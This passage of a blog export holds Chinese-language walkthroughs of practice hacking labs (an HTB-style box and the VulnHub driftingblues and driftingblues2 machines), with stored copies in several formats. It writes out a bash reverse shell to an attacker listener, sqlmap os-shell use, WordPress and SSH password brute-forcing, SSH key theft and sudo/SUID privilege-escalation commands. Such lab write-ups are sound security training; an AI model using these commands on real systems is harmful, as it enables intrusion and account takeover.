alt=\"Screenshot_2021-08-02_11_38_54\"></p>\n<p>因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录</p>\n<pre><code>ftpuser/mc@F1l3ZilL4\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png\" alt=\"Screenshot_2021-08-02_11_40_03\"></p>\n<p>直接输入上一题中获得的用户名和密码可以成功登录</p>\n<p><img src=\"https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png\" alt=\"Screenshot_2021-08-02_11_40_34\"></p>\n<p>可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png\" alt=\"Screenshot_2021-08-02_11_40_55\"></p>\n<p>我们直接使用john来爆破</p>\n<pre><code>zip2john backup.zip &gt; hash\njohn hash\n#因为我已经爆破过一次，所以可以直接show输出\njohn hash --show\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png\" alt=\"Screenshot_2021-08-02_11_47_56\"></p>\n<p>得到压缩包密码<code>7418529630</code>，解压后有<code>index.php</code>，从代码中可以看到用户名和md5加密的密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png\" alt=\"Screenshot_2021-08-02_11_48_29\"></p>\n<p>将md5加密的密码到在线的md5解密网站解密，得到密码为<code>qwerty789</code></p>\n<p><img src=\"https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png\" alt=\"Screenshot_2021-08-02_11_49_39\"></p>\n<p>回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下</p>\n<p><img src=\"https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png\" alt=\"Screenshot_2021-08-02_14_15_39\"></p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入</p>\n<p><img src=\"https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png\" alt=\"Screenshot_2021-08-02_14_15_53\"></p>\n<p>那就直接用sqlmap跑，注意cookie要改成自己的值</p>\n<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png\" alt=\"Screenshot_2021-08-03_09_22_43\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png\" alt=\"Screenshot_2021-08-03_09_26_33\"></p>\n<p>可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell</p>\n<pre><code>sqlmap -u &#39;http://10.10.10.46/dashboard.php?search=a --cookie=&quot;PHPSESSID=1ah5j9312pm8sf4sktan1gdll1&quot; --os-shell\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png\" alt=\"Screenshot_2021-08-03_09_27_03\"></p>\n<p>接下来反弹shell，开启一个监听端口</p>\n<p><img src=\"https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png\" alt=\"Screenshot_2021-08-03_09_27_50\"></p>\n<p>在sqlmap的shell中输入</p>\n<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.60/1234 0&gt;&amp;1&#39;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png\" alt=\"Screenshot_2021-08-03_09_28_01\"></p>\n<p>成功接收到反弹的shell</p>\n<p><img src=\"https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png\" alt=\"Screenshot_2021-08-03_09_28_19\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png\" alt=\"Screenshot_2021-08-03_09_29_41\"></p>\n<p>先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码</p>\n<p><img src=\"https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png\" alt=\"Screenshot_2021-08-03_09_31_35\"></p>\n<p>接下来先得到交互式的shell</p>\n<pre><code>#看别的walkthrough说是两个都可以，但是我用第一个不行\nSHELL=/bin/bash script -q /dev/null\npython3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;\n</code></pre>\n<p>得到交互式的shell后，可以通过<code>sudo -l</code>命令查看当前用户的权限，用户被允许编辑配置文件<code>/etc/postgresql/11/main/pg_hba.conf</code>，可以利用<code>vi</code>并验证密码提权至<code>root</code></p>\n<pre><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png\" alt=\"Screenshot_2021-08-03_09_33_34\"></p>\n<p><img src=\"https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png\" alt=\"Screenshot_2021-08-03_09_34_36\"></p>\n<p>输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得<code>root</code>权限</p>\n<pre><code>:!/bin/bash\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png\" alt=\"Screenshot_2021-08-03_09_35_30\"></p>\n<p>最后就可以读取root的flag了</p>\n<p><img src=\"https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png\" alt=\"Screenshot_2021-08-03_09_36_08\"></p>\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://www.echocipher.life/index.php/archives/891/\">https://www.echocipher.life/index.php/archives/891/</a></p>\n</blockquote>\n"},{"title":"driftingblues2 VulnHub Walkthrough","date":"2021-10-12T08:31:08.000Z","_content":"\n## driftingblues2 VulnHub Walkthrough\n\n### 信息收集\n\n#### 主机探测\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png)\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.171\n```\n\n![](https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png)\n\n开放端口：21(ftp)、22(ssh)、80(http)\n\n可以匿名访问ftp服务，有一张图片，应该有隐藏的信息\n\n![](https://i.loli.net/2021/10/12/pk4b8jfBOyKsQSg.png)\n\n<img src=\"https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg\" style=\"zoom: 25%;\" />\n\n图片先放着，访问80端口没什么东西，扫一下目录\n\n```\ndirsearch -u http://192.168.62.171/\n```\n\n![](https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png)\n\n有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下\n\n![](https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png)\n\n![](https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png)\n\n用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名\n\n```\nwpscan --url http://driftingblues.box/blog/ -e u\n```\n\n![](https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png)\n\n再通过获取到的用户名albert，试试爆破密码\n\n```\nwpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt\n```\n\n![](https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png)\n\n稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码`albert:scotland1`登录后台\n\n![](https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png)\n\n### Get Shell\n\n通过修改主题的404.php来反弹shell\n\n![](https://i.loli.net/2021/10/12/9ONakjD2EB6ny4u.png)\n\n修改后先开启一个监听端口来接受shell\n\n![](https://i.loli.net/2021/10/12/a8W6ZkJjGcMBlpF.png)\n\n访问404.php成功反弹shell\n\n![](https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png)\n\n![](https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png)\n\n靶机有python环境，可以获取一个交互式的shell\n\n```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n```\n\n![](https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png)\n\n进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录\n\n![](https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png)\n\n```\nssh freddie@192.168.62.171 -i id_rsa\n```\n\n![](https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png)\n\n得到第一个flag\n\n<img src=\"https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png\" style=\"zoom: 67%;\" />\n\n### 提权\n\n![](https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png)\n\n可以看出来，接下来需要用nmap提权\n\n```\necho \"os.execute('/bin/sh')\" > shell.nse && sudo nmap --script=shell.nse\n```\n\n![](https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png)\n\n执行完获得root权限，但此时是看不到输入的，接着执行\n\n```\nreset\n```\n\n这时就可以获取第二个flag了\n\n<img src=\"https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png\" style=\"zoom:67%;\" />\n\n所以，一开始获取的图片还是没用上\n\n","source":"_posts/driftingblues2-VulnHub-Walkthrough.md","raw":"---\ntitle: driftingblues2 VulnHub Walkthrough\ndate: 2021-10-12 16:31:08\ncategories:\n- 渗透测试\ntags:\n- VulnHub\n---\n\n## driftingblues2 VulnHub Walkthrough\n\n### 信息收集\n\n#### 主机探测\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png)\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.171\n```\n\n![](https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png)\n\n开放端口：21(ftp)、22(ssh)、80(http)\n\n可以匿名访问ftp服务，有一张图片，应该有隐藏的信息\n\n![](https://i.loli.net/2021/10/12/pk4b8jfBOyKsQSg.png)\n\n<img src=\"https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg\" style=\"zoom: 25%;\" />\n\n图片先放着，访问80端口没什么东西，扫一下目录\n\n```\ndirsearch -u http://192.168.62.171/\n```\n\n![](https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png)\n\n有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下\n\n![](https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png)\n\n![](https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png)\n\n用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名\n\n```\nwpscan --url http://driftingblues.box/blog/ -e u\n```\n\n![](https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png)\n\n再通过获取到的用户名albert，试试爆破密码\n\n```\nwpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt\n```\n\n![](https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png)\n\n稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码`albert:scotland1`登录后台\n\n![](https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png)\n\n### Get Shell\n\n通过修改主题的404.php来反弹shell\n\n![](https://i.loli.net/2021/10/12/9ONakjD2EB6ny4u.png)\n\n修改后先开启一个监听端口来接受shell\n\n![](https://i.loli.net/2021/10/12/a8W6ZkJjGcMBlpF.png)\n\n访问404.php成功反弹shell\n\n![](https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png)\n\n![](https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png)\n\n靶机有python环境，可以获取一个交互式的shell\n\n```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n```\n\n![](https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png)\n\n进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录\n\n![](https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png)\n\n```\nssh freddie@192.168.62.171 -i id_rsa\n```\n\n![](https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png)\n\n得到第一个flag\n\n<img src=\"https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png\" style=\"zoom: 67%;\" />\n\n### 提权\n\n![](https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png)\n\n可以看出来，接下来需要用nmap提权\n\n```\necho \"os.execute('/bin/sh')\" > shell.nse && sudo nmap --script=shell.nse\n```\n\n![](https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png)\n\n执行完获得root权限，但此时是看不到输入的，接着执行\n\n```\nreset\n```\n\n这时就可以获取第二个flag了\n\n<img src=\"https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png\" style=\"zoom:67%;\" />\n\n所以，一开始获取的图片还是没用上\n\n","slug":"driftingblues2-VulnHub-Walkthrough","published":1,"updated":"2021-10-12T08:34:22.156Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckupad5tv0007wsvt2hkj0qxy","content":"<h2 id=\"driftingblues2-VulnHub-Walkthrough\"><a href=\"#driftingblues2-VulnHub-Walkthrough\" class=\"headerlink\" title=\"driftingblues2 VulnHub Walkthrough\"></a>driftingblues2 VulnHub Walkthrough</h2><h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"主机探测\"><a href=\"#主机探测\" class=\"headerlink\" title=\"主机探测\"></a>主机探测</h4><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png\"></p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.171\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png\"></p>\n<p>开放端口：21(ftp)、22(ssh)、80(http)</p>\n<p>可以匿名访问ftp服务，有一张图片，应该有隐藏的信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/pk4b8jfBOyKsQSg.png\"></p>\n<img src=\"https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg\" style=\"zoom: 25%;\" />\n\n<p>图片先放着，访问80端口没什么东西，扫一下目录</p>\n<pre><code>dirsearch -u http://192.168.62.171/\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png\"></p>\n<p>有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png\"></p>\n<p>用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名</p>\n<pre><code>wpscan --url http://driftingblues.box/blog/ -e u\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png\"></p>\n<p>再通过获取到的用户名albert，试试爆破密码</p>\n<pre><code>wpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png\"></p>\n<p>稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码<code>albert:scotland1</code>登录后台</p>\n<p><img src=\"https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png\"></p>\n<h3 id=\"Get-Shell\"><a href=\"#Get-Shell\" class=\"headerlink\" title=\"Get Shell\"></a>Get Shell</h3><p>通过修改主题的404.php来反弹shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/9ONakjD2EB6ny4u.png\"></p>\n<p>修改后先开启一个监听端口来接受shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/a8W6ZkJjGcMBlpF.png\"></p>\n<p>访问404.php成功反弹shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png\"></p>\n<p>靶机有python环境，可以获取一个交互式的shell</p>\n<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png\"></p>\n<p>进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录</p>\n<p><img src=\"https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png\"></p>\n<pre><code>ssh freddie@192.168.62.171 -i id_rsa\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png\"></p>\n<p>得到第一个flag</p>\n<img src=\"https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png\" style=\"zoom: 67%;\" />\n\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p><img src=\"https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png\"></p>\n<p>可以看出来，接下来需要用nmap提权</p>\n<pre><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png\"></p>\n<p>执行完获得root权限，但此时是看不到输入的，接着执行</p>\n<pre><code>reset\n</code></pre>\n<p>这时就可以获取第二个flag了</p>\n<img src=\"https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png\" style=\"zoom:67%;\" />\n\n<p>所以，一开始获取的图片还是没用上</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"driftingblues2-VulnHub-Walkthrough\"><a href=\"#driftingblues2-VulnHub-Walkthrough\" class=\"headerlink\" title=\"driftingblues2 VulnHub Walkthrough\"></a>driftingblues2 VulnHub Walkthrough</h2><h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"主机探测\"><a href=\"#主机探测\" class=\"headerlink\" title=\"主机探测\"></a>主机探测</h4><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png\"></p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.171\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png\"></p>\n<p>开放端口：21(ftp)、22(ssh)、80(http)</p>\n<p>可以匿名访问ftp服务，有一张图片，应该有隐藏的信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/pk4b8jfBOyKsQSg.png\"></p>\n<img src=\"https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg\" style=\"zoom: 25%;\" />\n\n<p>图片先放着，访问80端口没什么东西，扫一下目录</p>\n<pre><code>dirsearch -u http://192.168.62.171/\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png\"></p>\n<p>有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png\"></p>\n<p>用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名</p>\n<pre><code>wpscan --url http://driftingblues.box/blog/ -e u\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png\"></p>\n<p>再通过获取到的用户名albert，试试爆破密码</p>\n<pre><code>wpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png\"></p>\n<p>稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码<code>albert:scotland1</code>登录后台</p>\n<p><img src=\"https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png\"></p>\n<h3 id=\"Get-Shell\"><a href=\"#Get-Shell\" class=\"headerlink\" title=\"Get Shell\"></a>Get Shell</h3><p>通过修改主题的404.php来反弹shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/9ONakjD2EB6ny4u.png\"></p>\n<p>修改后先开启一个监听端口来接受shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/a8W6ZkJjGcMBlpF.png\"></p>\n<p>访问404.php成功反弹shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png\"></p>\n<p>靶机有python环境，可以获取一个交互式的shell</p>\n<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png\"></p>\n<p>进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录</p>\n<p><img src=\"https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png\"></p>\n<pre><code>ssh freddie@192.168.62.171 -i id_rsa\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png\"></p>\n<p>得到第一个flag</p>\n<img src=\"https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png\" style=\"zoom: 67%;\" />\n\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p><img src=\"https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png\"></p>\n<p>可以看出来，接下来需要用nmap提权</p>\n<pre><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png\"></p>\n<p>执行完获得root权限，但此时是看不到输入的，接着执行</p>\n<pre><code>reset\n</code></pre>\n<p>这时就可以获取第二个flag了</p>\n<img src=\"https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png\" style=\"zoom:67%;\" />\n\n<p>所以，一开始获取的图片还是没用上</p>\n"},{"title":"driftingblues VulnHub Walkthrough","date":"2021-10-12T08:24:52.000Z","_content":"\n## driftingblues VulnHub Walkthrough\n\n### 信息收集\n\n#### 主机探测\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png)\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.172\n```\n\n![](https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png)\n\n只开放了22和80端口，只能先访问80端口看一下有没有什么信息\n\n![](https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png)\n\n好像没什么东西，扫了目录也没什么信息\n\n![](https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png)\n\n右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径\n\n![](https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png)\n\n访问一下，这个很明显了，到在线的ook!解密网站解密一下\n\n![](https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png)\n\n是一个提示，应该是要修改host文件\n\n![](https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png)\n\n在主页上可以看到一个域名，尝试添加到host再访问\n\n![](https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png)\n\n![](https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png)\n\n重新扫目录还是没有发现，那就试试爆破子域名\n\n```\nwfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H \"Host:FUZZ.driftingblues.box\" --hw 570\n```\n\n![](https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png)\n\n直接访问解析不了，需要再修改一下host\n\n![](https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png)\n\n访问一下\n\n![](https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png)\n\n再扫一次目录，发现有robots.txt\n\n![](https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png)\n\n访问一下，看到给了一些路径\n\n![](https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png)\n\n查看ssh_cred.txt，给了提示\n\n![](https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png)\n\n### 漏洞利用\n\nssh登录的密码是`1mw4ckyyucky*`，目前还缺一位数字，一共十个可能的密码，先生成一下\n\n```\ncrunch 13 13 -t 1mw4ckyyucky% > pass\n```\n\n看一下我们生成的密码集合\n\n![](https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png)\n\n接下来尝试爆破ssh登录密码，根据前面访问`test.driftingblues.box`的提示，用户名应该是`eric`\n\n```\nhydra -l eric -P pass ssh://192.168.62.172\n```\n\n![](https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png)\n\n找到密码了，直接登录ssh\n\n![](https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png)\n\n直接获取第一个flag\n\n<img src=\"https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png\" style=\"zoom:67%;\" />\n\n### 提权\n\n```\nuname -a\nfind / -perm -u=s -type f 2>/dev/null\ngetcap -r  / 2>/dev/null\n```\n\n看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方\n\n在备份目录下有个backup.sh，看一下内容\n\n![](https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png)\n\n有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权\n\n思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了\n\n```\necho 'cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot' > /tmp/emergency\n#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限\nchmod +x emergency\n./getroot -p\n```\n\n![](https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png)\n\n![](https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png)\n\n现在可以获取第二个flag了\n\n<img src=\"https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png\" style=\"zoom:67%;\" />\n\n> 参考：\n>\n> https://blog.csdn.net/weixin_45922278/article/details/115277255\n","source":"_posts/driftingblues-VulnHub-Walkthrough.md","raw":"---\ntitle: driftingblues VulnHub Walkthrough\ndate: 2021-10-12 16:24:52\ncategories:\n- 渗透测试\ntags:\n- VulnHub\n---\n\n## driftingblues VulnHub Walkthrough\n\n### 信息收集\n\n#### 主机探测\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png)\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.172\n```\n\n![](https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png)\n\n只开放了22和80端口，只能先访问80端口看一下有没有什么信息\n\n![](https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png)\n\n好像没什么东西，扫了目录也没什么信息\n\n![](https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png)\n\n右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径\n\n![](https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png)\n\n访问一下，这个很明显了，到在线的ook!解密网站解密一下\n\n![](https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png)\n\n是一个提示，应该是要修改host文件\n\n![](https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png)\n\n在主页上可以看到一个域名，尝试添加到host再访问\n\n![](https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png)\n\n![](https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png)\n\n重新扫目录还是没有发现，那就试试爆破子域名\n\n```\nwfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H \"Host:FUZZ.driftingblues.box\" --hw 570\n```\n\n![](https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png)\n\n直接访问解析不了，需要再修改一下host\n\n![](https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png)\n\n访问一下\n\n![](https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png)\n\n再扫一次目录，发现有robots.txt\n\n![](https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png)\n\n访问一下，看到给了一些路径\n\n![](https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png)\n\n查看ssh_cred.txt，给了提示\n\n![](https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png)\n\n### 漏洞利用\n\nssh登录的密码是`1mw4ckyyucky*`，目前还缺一位数字，一共十个可能的密码，先生成一下\n\n```\ncrunch 13 13 -t 1mw4ckyyucky% > pass\n```\n\n看一下我们生成的密码集合\n\n![](https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png)\n\n接下来尝试爆破ssh登录密码，根据前面访问`test.driftingblues.box`的提示，用户名应该是`eric`\n\n```\nhydra -l eric -P pass ssh://192.168.62.172\n```\n\n![](https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png)\n\n找到密码了，直接登录ssh\n\n![](https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png)\n\n直接获取第一个flag\n\n<img src=\"https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png\" style=\"zoom:67%;\" />\n\n### 提权\n\n```\nuname -a\nfind / -perm -u=s -type f 2>/dev/null\ngetcap -r  / 